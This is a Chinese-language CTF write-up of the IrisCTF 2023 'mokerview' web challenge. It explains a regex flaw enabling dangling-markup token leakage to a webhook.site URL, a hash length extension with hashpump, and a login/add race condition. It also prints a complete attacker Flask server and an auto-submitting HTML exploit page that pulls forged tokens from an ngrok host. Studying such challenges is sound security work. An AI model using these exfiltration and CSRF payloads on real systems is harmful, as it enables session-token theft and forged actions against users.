# 题目描述

Classic bug combo pack

Admin will visit your URL after logging in.

# 解决方案

首先关注view函数，如下：

```python
@app.route("/view", methods=["GET"])
@session
def view(session):
    style = request.args.get("style", "/static/plain.css")
    if not STYLE_PATTERN.match(style):
        return "Bad style link"

    mokers = "<br>".join(f"<img src={imgur(moker)} referrerpolicy=no-referrer class=moker></img>" for moker in users[session["user"]]["mokers"])
    styles = " ".join(f"<a href=/view?style=/static/{s}>{s}</a>" for s in STYLES)
    return f"<!DOCTYPE html><html><head><link rel=stylesheet href={style}></head><body>{header(session)}<br>Use Some Styles: {styles}<br>Your'e Mokers: <br><br>{mokers}</body></html>"
```

其中style是我们控制，只要满足STYLE_PATTERN即可，这里有一个很容易疏忽的点，看正则表达式如下：

```python
STYLE_PATTERN = re.compile("^[A-Za-z0 -9./]+$")
```

注意这里不是`0-9`，而是` -9`，即空格到9，其中包含大量的特殊符号，因此我们在style中加入特殊符号也是满足正则表达式的；利用这一漏洞我们可以构造泄露token的style，比如设置style为`"//webhook.site/8096b06f-0c59-463a-8266-ae9605411c64/`，这样style后的html（直到`"`为止）会作为HTTP路径发送到我们的服务器上，我们看`header(session)`部分：

```python
def header(session):
    sign = signer(session)

    return f"<a href='{sign('/logout')}'>Logout</a> <a href='/view'>My Mokers</a> <a href='/add'>Add a Moker</a> <a href='/create'>Create a new Moker</a> <a href='/delete'>Remove Moker</a>\
<form id='add' method='POST' action='{sign('/add?daily=1')}'><input type='submit' value='*Add \"Moker of the Day\"*'/></form>"
```

直到Add后边的`"`为止的html都会发送到我们指定的服务器上，如果我们让admin bot访问这个url，我们就能拿到admin对`/add?daily=1`这一路径的签名。

但是仅仅有`/add?daily=1`还不够，我们需要`/add?daily=1&moker=flagmoker`的签名，这个时候可以使用[hashpump](https://github.com/bwall/HashPump)进行hash长度扩展攻击，拿到想要的签名；

我们可以分析add函数的源码，如下：

```python
@app.route("/add", methods=["POST"])
@csrf
@session
def add(session):
    moker = request.args.get("moker", None)
    if moker is None:
        if request.args.get('daily', False):
            moker = MOKEROFTHEDAY
    if (moker == "flagmoker" and session["user"] != "@admin") or moker not in MOKERS:
        return "Invalid moker"

    if requests.get(imgur(MOKERS[moker])).status_code != 200:
        return "This moker is not avaliable at this time"

    if(len(users[session["user"]]["mokers"]) > 30):
        # this is too many mokers for one person. you don't need this many
        users[session["user"]]["mokers"].clear()
    users[session["user"]]["mokers"].append(MOKERS[moker])
    return redirect("/view")
```

可以看到，最后moker添加到`session['user']`中，然后在源码中找到修改`session['user']`的函数，即login函数，如下所示：

```python
@app.route("/login", methods=["POST"])
def login():
    user = request.form.get("user", "")
    password = request.form.get("password", "")
    if user not in users:
        return "No user"
    if users[user]["password"] == password:
        response = make_response(redirect("/view"))
        sid = request.cookies.get("session", secrets.token_hex(16))
        sessions[sid].clear()
        response.set_cookie("session", sid, httponly=True)
        sessions[sid]["user"] = user
        sessions[sid]["key"] = secrets.token_bytes(16)
        return response
    return "Invalid user/pass"
```

可以看到sid和user是用户控制的，因此我们可以让admin bot连续访问发送login和add的请求，通过竞争条件，使得flagmoker添加到指定user的moker列表中，我们可以通过运行一个HTTP服务器，维护一个内嵌攻击脚本的网页，来综合上述所有步骤，攻击服务器代码如下：

```python
from flask import Flask, request, redirect, make_response, send_from_directory
import subprocess

app = Flask(__name__)

state = {"token": ""}

@app.errorhandler(404)
def handle404(e): # 404 is caused by token leak clobber
    u = request.url
    u = u.split("token=")[-1].split("%27")[0]
    if not u.isalnum():
        return "404"
    print("token", u)
    # use hashpump to grab the new token
    state["token"] = subprocess.check_output(["hashpump", "-k", "16", "-d", "/add?daily=1", "-a", "&moker=flagmoker", "-s", u]).decode().split("\n")[0]
    print("new", state["token"])
    return "OK"

@app.route("/token") # get the current forged token
def token():
    r = make_response(state["token"])
    r.headers["Access-Control-Allow-Origin"] = "*"
    return r

with open("sol.html") as f:
    SOL = f.read()

USER = "testingflagajsdafjha" # create the user first
# converts input into form //a.ngrok.io/
NGROK = input("base: ").split("https:")[1] + "/"
SOL = SOL.replace("{USER}",USER).replace("{NGROK}",NGROK)

@app.route("/index.html")
def index():
    return SOL

app.run(port=1337)
```

sol.html的内容如下：

```html
<!DOCTYPE html>
<html>
<body>
        <!-- view clobber -->
        <form id="f1" action="https://mokerview-web.chal.irisc.tf/view" target="_blank">
            <input type="hidden" name="style" value='"{NGROK}'></form>
        <!-- forged /add goes here -->
        <form id="f2" action="NONE" method="POST" target="_blank"></form>
        <!-- login to your user -->
        <form id="f3" action="https://mokerview-web.chal.irisc.tf/login" method="POST" target="_blank">
            <input type="hidden" name="user" value="{USER}"><input type="hidden" name="password" value="{USER}"></form>
<script>
let f1 = document.getElementById("f1");
f1.submit();
new Promise(r => setTimeout(r, 500)).then(_ => {
let base = "https://mokerview-web.chal.irisc.tf/add?args=ZGFpbHk9MYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA4CZtb2tlcj1mbGFnbW9rZXI%3D&token=";
    fetch("https://{NGROK}token").then(d => d.text()).then(token => {
    let url = base + token;
    let f2 = document.getElementById("f2");
    f2.action = url;
    let f3 = document.getElementById("f3");
    f2.submit();
    f3.submit();
})
});
</script>
</body>
</html>
```

```
irisctf{moker_loves_race_conditions}
```

参考链接：

- https://github.com/Seraphin-/ctf/blob/master/irisctf2023/mokerview.md